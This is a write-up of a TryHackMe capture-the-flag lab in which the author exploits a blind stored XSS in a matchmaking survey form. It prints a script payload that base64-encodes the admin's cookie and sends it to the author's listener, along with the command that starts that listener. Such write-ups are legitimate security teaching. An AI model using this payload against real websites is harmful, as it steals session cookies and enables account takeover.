---
title: "Cupid's Matchmaker Writeup TryHackMe"
authors: [shubham]
tags: [web, ctf, cybersecurity, xss]
---



## the thought process: sniffing out the vulnerability
when i first opened the lab, i was presented with a matchmaking survey. it asked for standard details like name, age, and what i was seeking. 

the real lightbulb moment happened right after hitting the submit button. a pop-up appeared that said something along the lines of .. "your survey would be viewed in short time." 

this immediately triggered that if an admin, a bot, or a "matchmaking team" is going to view my answers later, that means two things:
1. my input is being saved to a database somewhere (stored).
2. someone else's browser will render my input on an internal dashboard (blind).

this is the perfect recipe for a blind stored xss attack. if the developers didn't sanitize the inputs before displaying them on the admin panel, i could force the admin's browser to execute malicious javascript and steal their session cookie.


## the setup: preparing the trap
to catch the admin's cookie, i needed a way for their browser to "phone home" to my machine. since i was connected to the tryhackme vpn, i decided to spin up a local server.

first, i had to find my vpn ip. since i am on a mac, standard linux commands didn't show the right interface. i checked my interfaces and found my vpn ip on `utun4`, which was `192.168.137.132`.

next, i started a simple python web server in my terminal to act as my listener. i left this running in the background:

`python3 -m http.server 8000`


## the attack: injecting the payload

with my listener running, i went back to the survey form. i needed a payload that would grab the admin's cookie, encode it in base64 (to prevent special characters from breaking the url), and send it back to my python server.  
  
i crafted this simple fetch request:

`<script>fetch('http://your_vpn_ip:8000/?cookie=' + btoa(document.cookie))</script>`

i injected this exact script into the text fields of the survey, such as the "name" field, and submitted the form again.

## the result: catching the flag.  

after submitting, i just had to wait and watch my terminal. because it was a blind xss vulnerability, i couldn't see the execution happen on the website itself.  

however, within a short time, the background admin bot reviewed my matchmaking survey. the unsanitized page loaded my `<script>` tag, and my python server terminal lit up with a successful get request containing the base64-encoded cookie.  

